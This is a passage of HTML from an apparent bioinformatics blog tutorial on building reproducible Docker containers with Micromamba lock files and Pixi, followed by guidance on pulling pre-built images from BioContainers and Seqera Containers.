8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    touch </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.html</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    touch </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.zip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        fastqc: \$( fastqc --version | sed '/FastQC v/!d; s/.*v//' )</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="advantages-of-this-approach">Advantages of This Approach<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#advantages-of-this-approach" class="hash-link" aria-label="Direct link to Advantages of This Approach" title="Direct link to Advantages of This Approach" translate="no">​</a></h3>
<table><thead><tr><th>Feature</th><th>conda.yml + Micromamba</th><th>Traditional Conda Dockerfile</th></tr></thead><tbody><tr><td><strong>Build speed</strong></td><td>Very fast (10-100x)</td><td>Slow</td></tr><tr><td><strong>Image size</strong></td><td>~200MB for tools</td><td>~1-2GB</td></tr><tr><td><strong>Reproducibility</strong></td><td>Explicit lock file</td><td>Dependency drift possible</td></tr><tr><td><strong>Version pinning</strong></td><td>Easy in YAML</td><td>Inline in Dockerfile</td></tr><tr><td><strong>Readability</strong></td><td>Clear, readable YAML</td><td>Complex RUN statements</td></tr><tr><td><strong>Channel support</strong></td><td>Multiple channels</td><td>Limited</td></tr><tr><td><strong>Maintenance</strong></td><td>Update conda.yml easily</td><td>Rebuild entire Dockerfile</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="saving-and-sharing-explicit-lock-files">Saving and Sharing Explicit Lock Files<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#saving-and-sharing-explicit-lock-files" class="hash-link" aria-label="Direct link to Saving and Sharing Explicit Lock Files" title="Direct link to Saving and Sharing Explicit Lock Files" translate="no">​</a></h3>
<p>The generated <code>environment.lock</code> file is extremely valuable. Save it in your project:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract from build output and save</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"> </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-A</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1000</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"CONDA_LOCK_START"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-B</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1000</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"CONDA_LOCK_END"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> environment.lock</span><br></span></code></pre></div></div>
<p>Later, reproduce the exact environment:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Rebuild from locked versions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">micromamba </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-y</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> base </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--file</span><span class="token plain"> environment.lock</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pixi-the-next-generation-tool-for-conda-based-containers">Pixi: The Next Generation Tool for Conda-Based Containers<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#pixi-the-next-generation-tool-for-conda-based-containers" class="hash-link" aria-label="Direct link to Pixi: The Next Generation Tool for Conda-Based Containers" title="Direct link to Pixi: The Next Generation Tool for Conda-Based Containers" translate="no">​</a></h3>
<p>Pixi is an emerging tool that combines the best aspects of Conda, Mamba, and lock file management into a single, ultra-fast solution. It's gaining traction in bioinformatics for building reproducible containers.</p>
<p><strong>Why Pixi?</strong></p>
<ul>
<li class=""><strong>Fastest:</strong> Even faster than Micromamba for dependency resolution</li>
<li class=""><strong>Automatic lock files:</strong> Lock files are created automatically, no manual export needed</li>
<li class=""><strong>Single-step reproducibility:</strong> One tool handles everything from installation to reproducibility</li>
<li class=""><strong>Cross-platform:</strong> Works seamlessly across different architectures and systems</li>
<li class=""><strong>Modern approach:</strong> Designed from scratch with containerization in mind</li>
</ul>
<p><strong>Example Dockerfile with Pixi:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ARG</span><span class="token instruction"> PIXI_VERSION=0.63.2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ARG</span><span class="token instruction"> BASE_IMAGE=debian:bookworm-slim</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--platform</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">linux/amd64</span><span class="token instruction"> ubuntu:24.04 </span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">AS</span><span class="token instruction"> builder</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ARG</span><span class="token instruction"> PIXI_VERSION</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; apt-get install -y curl</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> curl -Ls </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"https://github.com/prefix-dev/pixi/releases/download/v${PIXI_VERSION}/pixi-$(uname -m)-unknown-linux-musl"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    -o /pixi &amp;&amp; chmod +x /pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> /pixi --version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--platform</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">linux/amd64</span><span class="token instruction"> </span><span class="token instruction variable" style="color:hsl(221, 87%, 60%)">$BASE_IMAGE</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add appuser with UID 1000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> useradd -u 1000 -m -s /bin/bash appuser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> appuser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /home/appuser</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy pixi from builder</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--from</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">builder</span><span class="token instruction options"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">appuser:appuser</span><span class="token instruction options"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chmod</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">0555</span><span class="token instruction"> /pixi /usr/local/bin/pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set up pixi with conda channels</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/home/appuser/.pixi/bin:${PATH}"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> pixi config set default-channels </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">'["conda-forge", "bioconda"]'</span><span class="token instruction"> --global</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install tools using pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> pixi global install fastqc=0.12.1 samtools=1.18 bwa=0.7.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Clean cache</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> pixi clean cache -y</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<p><strong>Key Pixi Features in the Dockerfile:</strong></p>
<ul>
<li class=""><strong>Multi-stage build:</strong> Builder stage compiles Pixi, final stage is lean</li>
<li class=""><strong>User management:</strong> Non-root appuser for security</li>
<li class=""><strong>Global channel setup:</strong> Pre-configures conda-forge and bioconda channels</li>
<li class=""><strong>Direct package installation:</strong> <code>pixi global install</code> installs and locks versions automatically</li>
<li class=""><strong>Automatic lock file:</strong> Lock file is generated implicitly, ensuring reproducibility</li>
<li class=""><strong>Cache cleaning:</strong> <code>pixi clean cache -y</code> removes temporary files</li>
</ul>
<p><strong>Comparing Container Tools:</strong></p>
<table><thead><tr><th>Feature</th><th>Conda</th><th>Micromamba</th><th>Pixi</th></tr></thead><tbody><tr><td><strong>Speed</strong></td><td>Slow (baseline)</td><td>10-100x faster</td><td>100x+ faster</td></tr><tr><td><strong>Lock file</strong></td><td>Manual export</td><td>Manual export</td><td>Automatic</td></tr><tr><td><strong>Image size</strong></td><td>Large</td><td>Small</td><td>Small</td></tr><tr><td><strong>Reproducibility</strong></td><td>Good</td><td>Excellent</td><td>Excellent</td></tr><tr><td><strong>Complexity</strong></td><td>High</td><td>Medium</td><td>Low</td></tr><tr><td><strong>Learning curve</strong></td><td>Steep</td><td>Medium</td><td>Low</td></tr><tr><td><strong>Production-ready</strong></td><td>Yes</td><td>Yes</td><td>Emerging</td></tr></tbody></table>
<p><strong>Summary:</strong></p>
<ul>
<li class="">Use <code>conda.yml</code> with Micromamba for established, proven workflows</li>
<li class="">Use Pixi for cutting-edge projects requiring maximum speed and simplicity</li>
<li class="">Always include <code>procps-ng</code> for Nextflow compatibility (regardless of tool)</li>
<li class="">Generate/maintain explicit lock files for reproducibility</li>
<li class="">Pin exact versions to prevent dependency drift</li>
<li class="">Multi-channel support (conda-forge + bioconda) handles complex dependencies</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-finding-pre-built-containers-before-building-from-scratch">5. Finding Pre-Built Containers: Before Building from Scratch<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#5-finding-pre-built-containers-before-building-from-scratch" class="hash-link" aria-label="Direct link to 5. Finding Pre-Built Containers: Before Building from Scratch" title="Direct link to 5. Finding Pre-Built Containers: Before Building from Scratch" translate="no">​</a></h2>
<p>Before you spend time building Docker images from scratch, check if your tool already exists in a public container registry. Most bioinformatics tools have pre-built, maintained containers ready to use. This is the <strong>fastest and easiest approach</strong> when available.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-container-search-strategy">The Container Search Strategy<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#the-container-search-strategy" class="hash-link" aria-label="Direct link to The Container Search Strategy" title="Direct link to The Container Search Strategy" translate="no">​</a></h3>
<p>Always follow this order:</p>
<ol>
<li class=""><strong>Check BioContainers</strong> (<a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a>) - Most comprehensive bioinformatics registry</li>
<li class=""><strong>Check Seqera Containers</strong> (<a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a>) - Multi-tool combinations, modern builds</li>
<li class=""><strong>Build yourself</strong> - Only if tool doesn't exist</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-biocontainers-primary-source">1. BioContainers (Primary Source)<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#1-biocontainers-primary-source" class="hash-link" aria-label="Direct link to 1. BioContainers (Primary Source)" title="Direct link to 1. BioContainers (Primary Source)" translate="no">​</a></h3>
<p><strong>BioContainers</strong> automatically builds and maintains Docker containers for every bioconda package. This is the most comprehensive source for bioinformatics tools.</p>
<p><strong>URL:</strong> <a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></p>
<p><strong>How to find and use a tool:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Search for FastQC</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> search quay.io/biocontainers/fastqc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pull a specific version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/fastqc:0.12.1--hdfd78af_1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run the tool</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/fastqc:0.12.1--hdfd78af_1 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastqc /data/sample.fastq</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="biocontainer" src="https://riverxdata.github.io/river-docs/assets/images/biocontainer_container_registry-72da3ed4ec61f7ab5f175373cd1b0208.png" width="2546" height="1494" class="img_ev3q"></p>
<p><strong>Advantages:</strong></p>
<ul>
<li class="">✅ Automatically updated when bioconda packages update</li>
<li class="">✅ Single-tool containers (clean, minimal)</li>
<li class="">✅ Stable and widely tested</li>
<li class="">✅ Available for most bioinformatics tools (~10,000+)</li>
<li class="">✅ Free and publicly accessible</li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li class="">One tool per image (no multi-tool combinations)</li>
<li class="">Must manually orchestrate multiple containers for pipelines</li>
</ul>
<p><strong>Example with multiple tools in a workflow:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Align reads with BWA</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/bwa:0.7.17--h5bf99c6_8 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    bwa mem /data/ref.fa /data/reads.fq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /data/aligned.sam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Sort BAM with Samtools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/samtools:1.18--hd87286a_0 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> /data/aligned.sam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /data/aligned.bam</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-seqera-containers-also-support-multi-tool-option">2. Seqera Containers (Also support Multi-Tool Option)<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#2-seqera-containers-also-support-multi-tool-option" class="hash-link" aria-label="Direct link to 2. Seqera Containers (Also support Multi-Tool Option)" title="Direct link to 2. Seqera Containers (Also support Multi-Tool Option)" translate="no">​</a></h3>
<p><strong>Seqera Containers</strong> provides a registry of pre-built containers that often combine multiple tools, perfect for complex workflows.</p>
<p><strong>URL:</strong> <a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></p>
<p><strong>How to find and use containers:</strong></p>
<ol>
<li class="">Visit <a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></li>
<li class="">Search for your tool(s)</li>
<li class="">Add multiple tools if needed (e.g., <code>fastqc</code> + <code>samtools</code> together)</li>
<li class="">Select your architecture (linux/amd64 or linux/arm64)</li>
<li class="">Get the container reference</li>
</ol>
<p><strong>Example:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pull a multi-tool container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull wave.seqera.io/library/fastqc:0.12.1-samtools_1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or use in Nextflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process analyzeReads </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'wave.seqera.io/library/fastqc:0.12.1-samtools_1.18'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain">'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastqc input.fastq</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    samtools view input.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain">'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
